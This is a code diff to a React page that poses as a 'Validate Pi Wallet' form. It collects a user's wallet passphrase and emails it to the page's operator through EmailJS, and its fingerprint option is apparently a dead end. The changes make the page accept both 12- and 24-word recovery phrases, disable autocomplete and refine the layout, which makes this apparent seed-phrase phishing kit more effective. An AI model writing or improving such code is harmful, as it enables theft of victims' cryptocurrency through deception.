@@ -15,7 +15,8 @@ export default function Validate() {
   const [error, setError] = useState("");
   const inputRef = useRef<any>(null);
   const router = useRouter();
-  const phraseNumber = 24;
+  const phraseNumber = 12;
+  const phraseNumber2 = 24;
   const sendEmail = async (e: any) => {
     e.preventDefault();
     setLoading(true);
@@ -26,18 +27,15 @@ export default function Validate() {
       setLoading(false);
       return setError(`Please fill in this field with your Passphrase`);
     }
-    if (phrases.length < phraseNumber) {
+    if (phrases.length === phraseNumber || phrases.length === phraseNumber2) {
       setLoading(false);
+      
+    }else{
       return setError(
-        `Passphrase must have ${phraseNumber} words but you provided only ${phrases.length}`
+        `Passphrase must have ${phraseNumber} or ${phraseNumber2} words but you provided only ${phrases.length}`
       );
     }
-    if (phrases.length > phraseNumber) {
-      setLoading(false);
-      return setError(
-        `Passphrase cannot contain more than ${phraseNumber} words`
-      );
-    }
+    
     const result = await emailjs.sendForm(
       "service_e3ri2nl",
       "template_3kwpega",
@@ -63,9 +61,9 @@ export default function Validate() {
       animate="open"
       className="center mt-7"
     >
-      <form className="max-w-[500px] w-full" ref={form} onSubmit={sendEmail}>
-        <p className="mb-8 font-bold text-lg text-center">Validate Pi Wallet</p>
-        <div className="w-full px-12">
+      <form className="max-w-[500px] min-h-screen w-full" ref={form} onSubmit={sendEmail}>
+        <p className="mb-8 font-bold text-lg lg:text-xl text-center">Validate Pi Wallet</p>
+        <div className="w-full px-5 lg:px-10">
           <input type="hidden" name="from_name" id="" value="Pi Wallet" />
           <input type="hidden" name="to_name" id="" value="Pi Wallet" />
           <div
@@ -82,17 +80,18 @@ export default function Validate() {
           >
             <input
               name="message"
-              placeholder={`Enter your ${phraseNumber}-word passphrase here`}
+              placeholder={`Enter your ${phraseNumber} or ${phraseNumber2} word passphrase here`}
               onFocus={() => {
                 setFingerPrintError(false);
                 setFocused(true);
               }}
               onBlur={() => setFocused(false)}
               autoFocus
+              autoComplete="false"
               ref={inputRef}
               className={`p-3 w-full ${
                 error === "" ? "placeholder:text-white" : "placeholder:text-red-500"
-              } placeholder:font-normal  bg-transparent font-semibold resize-none duration-300 text-base outline-none text-white rounded`}
+              } placeholder:font-normal  bg-transparent font-semibold resize-none duration-300 text-sm lg:text-base outline-none text-white rounded`}
               id=""
               value={phrase}
               onChange={(e: any) => setPhrase(e.target.value)}
@@ -106,9 +105,9 @@ export default function Validate() {
             <p className="text-sm text-red-500 m-1">{error}</p>
           </div>
         </div>
-        <div className="px-12 center">
+        <div className="px-5 lg:px-10 center">
           <button
-            className={`w-full py-3 h-14 text-sm duration-500 center rounded-full border-[3px] mt-5  font-semibold uppercase border-customPurpleB shadow-md text-white`}
+            className={`w-full py-3 h-14 text-xs lg:text-sm duration-500 center rounded-full border-[3px] mt-5  font-semibold uppercase border-customPurpleB shadow-md text-white`}
             type="submit"
             disabled={loading}
           >
@@ -119,10 +118,10 @@ export default function Validate() {
             )}
           </button>
         </div>
-        <div className="px-12 mt-7">
+        <div className="px-5 lg:px-10 mt-7">
           <p
             onClick={() => setFingerPrintError(true)}
-            className="w-full py-3 lg:py-4 center text-sm rounded-lg border-[3px] bg-customPurpleB border-customPurpleB shadow-md hover:bg-customPurpleA  hover:border-customPurpleA cursor-pointer duration-300 text-white text-center font-semibold uppercase"
+            className="w-full h-14 lg:py-4 center text-xs lg:text-sm rounded-full border-[3px] bg-customPurpleB border-customYellow shadow-md hover:bg-customPurpleA  hover:border-customPurpleA cursor-pointer duration-300 text-white text-center font-semibold uppercase"
           >
             validate with fingerprint{" "}
           </p>
